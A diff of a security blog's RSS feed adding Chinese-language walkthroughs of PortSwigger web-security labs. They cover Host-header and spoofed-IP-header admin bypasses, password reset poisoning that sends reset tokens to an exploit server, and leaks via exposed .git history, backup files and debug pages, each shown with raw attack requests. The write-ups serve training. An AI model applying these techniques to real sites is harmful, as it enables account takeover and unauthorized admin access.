@@ -1,4 +1,258 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>en1r0py</title><link>/</link><description>Recent content on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Thu, 19 Dec 2024 21:24:42 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Stealing OAuth access tokens via an open redirect</title><link>/posts/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect/</link><pubDate>Thu, 19 Dec 2024 21:24:42 +0800</pubDate><guid>/posts/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>en1r0py</title><link>/</link><description>Recent content on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 22 Dec 2024 23:01:39 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Host header authentication bypass</title><link>/posts/2024/host-header-attack-lab-lab-host-header-authentication-bypass/</link><pubDate>Sun, 22 Dec 2024 23:01:39 +0800</pubDate><guid>/posts/2024/host-header-attack-lab-lab-host-header-authentication-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-lab-host-header-authentication-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-lab-host-header-authentication-bypass-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>访问&lt;code>/admin&lt;/code>
+&lt;img alt="Admin" src="/img/2024/host-header-attack-lab-lab-host-header-authentication-bypass-2.jpg">&lt;/li>
+&lt;li>根据题目提示&lt;code>基于 HTTP Host 头对用户的权限级别进行假设&lt;/code>，修改步骤1请求&lt;code>Host&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">localhost&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;section&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;h1&amp;gt;Users&amp;lt;/h1&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;div&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;wiener - &amp;lt;/span&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=wiener&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;div&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/section&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改url并发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">localhost&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Basic password reset poisoning</title><link>/posts/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning/</link><pubDate>Sun, 22 Dec 2024 22:06:09 +0800</pubDate><guid>/posts/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击&lt;code>My account&lt;/code>并点击&lt;code>Forgot password?&lt;/code>，并输入&lt;code>wiener&lt;/code>，对应请求如下
+&lt;img alt="Login" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-2.jpg">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a16009403d415b6d5e881ad008a004c.web-security-academy.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=nYHLZecComsDUANkqK08uANGbcCZYk6X&amp;amp;username=wiener
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>、&lt;code>Email client&lt;/code>，重置的链接如下
+&lt;img alt="Email client" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-3.jpg">&lt;/li>
+&lt;li>回到主页再次点击&lt;code>My account&lt;/code>、&lt;code>Forgot password?&lt;/code>，并使用Burp Intercept拦截请求后发送到Burp Repeater，并修改&lt;code>Host&lt;/code>为&lt;code>exploit-server&lt;/code>后发送
+&lt;img alt="Login" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-4.jpg">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">exploit-0ad000c8038915a8d5c5801601700056.exploit-server.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=gzFCxNImVsCRkkDFSz0WzmSIjVO79eyc&amp;amp;username=carlos
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>、&lt;code>Access log&lt;/code>
+&lt;img alt="Access log" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-5.jpg">&lt;/li>
+&lt;li>访问&lt;code>/forgot-password?temp-forgot-password-token=5m63f7q3b6e7sh9s1bd6tb3hksjl8a7v&lt;/code>
+&lt;img alt="Password reset" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-6.jpg">&lt;/li>
+&lt;li>使用&lt;code>carlos&lt;/code>与修改后的密码登录即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Information disclosure in version control history</title><link>/posts/2024/information-disclosure-lab-infoleak-in-version-control-history/</link><pubDate>Sun, 22 Dec 2024 20:58:00 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-in-version-control-history/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>通过枚举工具(例如&lt;code>gobuster&lt;/code>)，获得目标url&lt;code>/.git&lt;/code>
+&lt;img alt="Git url" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-2.jpg">&lt;/li>
+&lt;li>通过&lt;code>curl&lt;/code>将&lt;code>/.git&lt;/code>下载到本地
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget -r https://0a71001f0385f2e680a2d05f00890056.web-security-academy.net/.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cd 0a71001f0385f2e680a2d05f00890056.web-security-academy.net/.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git log
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit 80e7a7b5d124b8aaed33c91e19ce74ebf75be56b &lt;span style="color:#f92672">(&lt;/span>HEAD -&amp;gt; master&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Carlos Montoya &amp;lt;carlos@carlos-montoya.net&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Tue Jun &lt;span style="color:#ae81ff">23&lt;/span> 14:05:07 &lt;span style="color:#ae81ff">2020&lt;/span> +0000
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Remove admin password from config
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit 21ea1423ac98788feb9be6e60815e568e10b313b
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Carlos Montoya &amp;lt;carlos@carlos-montoya.net&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Mon Jun &lt;span style="color:#ae81ff">22&lt;/span> 16:23:42 &lt;span style="color:#ae81ff">2020&lt;/span> +0000
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Add skeleton admin panel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git show 80e7a7b5d124b8aaed33c91e19ce74ebf75be56b
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit 80e7a7b5d124b8aaed33c91e19ce74ebf75be56b &lt;span style="color:#f92672">(&lt;/span>HEAD -&amp;gt; master&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Carlos Montoya &amp;lt;carlos@carlos-montoya.net&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Tue Jun &lt;span style="color:#ae81ff">23&lt;/span> 14:05:07 &lt;span style="color:#ae81ff">2020&lt;/span> +0000
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Remove admin password from config
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>diff --git a/admin.conf b/admin.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>index d256cbe..21d23f1 &lt;span style="color:#ae81ff">100644&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--- a/admin.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+++ b/admin.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@@ -1 +1 @@
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-ADMIN_PASSWORD&lt;span style="color:#f92672">=&lt;/span>zq9gi2jl81wpv0bdwqgd
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ADMIN_PASSWORD&lt;span style="color:#f92672">=&lt;/span>env&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ADMIN_PASSWORD&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>通过&lt;code>administrator:zq9gi2jl81wpv0bdwqgd&lt;/code>登录，点击右上方&lt;code>Admin panel&lt;/code>，并点击&lt;code>carlos - Delete&lt;/code>即可解题
+&lt;img alt="Admin panel" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-3.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Authentication bypass via information disclosure</title><link>/posts/2024/information-disclosure-lab-infoleak-authentication-bypass/</link><pubDate>Sun, 22 Dec 2024 20:36:07 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-authentication-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
+&lt;li>访问&lt;code>/admin&lt;/code>
+&lt;img alt="Admin" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-2.jpg">&lt;/li>
+&lt;li>尝试使用&lt;code>TRACE&lt;/code> method访问&lt;code>/admin&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">TRACE&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Custom-IP-Authorization: 141.11.46.54
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>新增&lt;code>X-Custom-Ip-Authorization: 127.0.0.1&lt;/code>，并再次使用&lt;code>GET&lt;/code>method访问&lt;code>/admin&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Custom-Ip-Authorization: 127.0.0.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>通过Burp Poxy自动在每个请求中新增&lt;code>X-Custom-Ip-Authorization: 127.0.0.1&lt;/code>，点击&lt;code>Proxy settings&lt;/code>，并下滑到&lt;code>HTTP match and replace rules&lt;/code>点击&lt;code>add&lt;/code>
+&lt;img alt="HTTP match and replace rules" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-3.jpg">&lt;/li>
+&lt;li>通过浏览器访问&lt;code>/admin&lt;/code>可看到管理页面，点击&lt;code>carlos - Delete&lt;/code>后即可解题
+&lt;img alt="Admin" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-4.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Source code disclosure via backup files</title><link>/posts/2024/information-disclosure-lab-infoleak-via-backup-files/</link><pubDate>Sun, 22 Dec 2024 20:26:27 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-via-backup-files/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-via-backup-files-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-via-backup-files-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>访问&lt;code>/robots.txt&lt;/code>url，内容如下
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>User-agent: *
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disallow: /backup
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>访问&lt;code>/backup&lt;/code>url，内容如下
+&lt;img alt="Backup files" src="/img/2024/information-disclosure-lab-infoleak-via-backup-files-2.jpg">&lt;/li>
+&lt;li>点击&lt;code>ProductTemplate.java.bak&lt;/code>后可以看到&lt;code>postgresql&lt;/code>的连接密码
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">ProductTemplate&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Serializable
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">readObject&lt;/span>(ObjectInputStream inputStream) &lt;span style="color:#66d9ef">throws&lt;/span> IOException, ClassNotFoundException
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inputStream.&lt;span style="color:#a6e22e">defaultReadObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ConnectionBuilder connectionBuilder &lt;span style="color:#f92672">=&lt;/span> ConnectionBuilder.&lt;span style="color:#a6e22e">from&lt;/span>(
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;org.postgresql.Driver&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;postgresql&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;localhost&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 5432,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;postgres&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;postgres&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;n8r1bjlxpxzzsmjo692mxd67qtw1wfqj&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ).&lt;span style="color:#a6e22e">withAutoCommit&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到主页后点击最上方&lt;code>Submit solution&lt;/code>并填入密码即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Information disclosure on debug page</title><link>/posts/2024/information-disclosure-lab-infoleak-on-debug-page/</link><pubDate>Sun, 22 Dec 2024 20:17:39 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-on-debug-page/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-on-debug-page-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-on-debug-page-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>在进入Lab首页时，查看源码会找到php管理页面
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!-- &amp;lt;a href=/cgi-bin/phpinfo.php&amp;gt;Debug&amp;lt;/a&amp;gt; --&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>访问&lt;code>/cgi-bin/phpinfo.php&lt;/code>后搜索&lt;code>SECRET_KEY&lt;/code>，将结果填入&lt;code>Submit solution&lt;/code>内即可解题
+&lt;img alt="SECRET_KEY" src="/img/2024/information-disclosure-lab-infoleak-on-debug-page-2.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Information disclosure in error messages</title><link>/posts/2024/information-disclosure-lab-infoleak-in-error-messages/</link><pubDate>Sun, 22 Dec 2024 20:08:27 +0800</pubDate><guid>/posts/2024/information-disclosure-lab-infoleak-in-error-messages/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-error-messages-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-error-messages-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击页面任一商品的&lt;code>View details&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /product?productId=1
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改&lt;code>productId&lt;/code>参数，获得报错信息
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=x &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">500&lt;/span> &lt;span style="color:#a6e22e">Internal Server Error&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Internal Server Error: java.lang.NumberFormatException: For input string: &amp;#34;x&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Apache Struts 2 2.3.31
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>点击最上方&lt;code>Submit solution&lt;/code>，将&lt;code>Apache Struts 2&lt;/code>版本输入后即可解题&lt;/li>
